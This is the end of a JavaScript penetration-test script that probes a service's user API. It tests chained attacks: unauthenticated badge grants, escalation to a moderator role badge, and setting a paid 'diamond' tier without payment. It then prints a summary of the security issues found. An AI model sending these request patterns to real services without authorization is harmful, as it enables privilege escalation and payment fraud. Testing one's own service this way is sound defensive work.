  console.log('\n--- Cross-Endpoint Chained Attacks ---');

  await test('Chain: badge grant then check user perks', async () => {
    // Try to grant og:beta_tester, then check if it appears in perks
    const target = makeAgent();
    const grant = await api('POST', `/user/${target.address}/badges/grant`, {
      body: { badge: 'og:beta_tester', grantedBy: 'pentest' }
    });
    if (grant.status === 200 && grant.data?.success) {
      const perks = await api('GET', `/user/${target.address}/perks`);
      if (perks.data?.badges?.includes('og:beta_tester')) {
        // Clean up
        await api('DELETE', `/user/${target.address}/badges/og:beta_tester`);
        return 'CRITICAL: Unauthenticated badge grant persists and visible in perks';
      }
    }
    return true;
  });

  await test('Chain: enum user badges via meta + grant', async () => {
    const r = await api('GET', '/user/badges/meta');
    if (r.status === 200 && r.data?.categories) {
      // Verify meta doesn't expose how to escalate
      const cats = Object.keys(r.data.categories);
      if (cats.includes('role')) {
        // Make sure role badges can't be granted
        const g = await api('POST', `/user/${attacker.address}/badges/grant`, {
          body: { badge: 'role:moderator', grantedBy: 'chain-test' }
        });
        if (g.status === 200 && g.data?.success) {
          return 'CRITICAL: Granted role:moderator badge! Moderator privilege escalation.';
        }
      }
    }
    return true;
  });

  await test('Chain: create user then try tier manipulation', async () => {
    const target = makeAgent();
    // Create user
    await api('POST', `/user/${target.address}`, { body: {} });
    // Try to set tier to diamond directly
    const r = await api('PUT', `/user/${target.address}`, {
      body: { tier: 'diamond' }
    });
    if (r.status === 200) {
      // Check if tier actually changed
      const check = await api('GET', `/user/${target.address}`);
      if (check.data?.tier === 'diamond' || check.data?.user?.tier === 'diamond') {
        return 'CRITICAL: Tier set to diamond without payment via PUT /user/:account';
      }
    }
    return true;
  });

  await test('Chain: faucet + verify (free verification via testnet)', async () => {
    // This tests if someone can get free verification by:
    // 1. Getting testnet XRP from faucet
    // 2. Using it to verify a token (since verify uses testnet RPC)
    // This is a design concern, not a bug (testnet verification is intentional)
    const r = await api('GET', '/verify/pricing');
    if (r.data?.network === 'testnet') {
      // Info: verification is on testnet — free to game
      return true; // Known design choice
    }
    return true;
  });

  // ═══════════════════════════════════════════════════════════════
  // SUMMARY
  // ═══════════════════════════════════════════════════════════════
  console.log(`\n=== Results: ${passed}/${total} passed, ${failed} failed ===`);

  if (issues.length) {
    console.log('\n=== SECURITY ISSUES FOUND ===');
    issues.forEach(i => {
      console.log(`  [${i.severity}] Test ${i.test}: ${i.name}`);
      console.log(`    ${i.detail}\n`);
    });
  }

  if (failed > 0) console.log('\nReview FAIL items above for vulnerabilities.');
  process.exit(failed > 0 ? 1 : 0);
}

main().catch(e => { console.error('Fatal:', e.message); process.exit(1); });
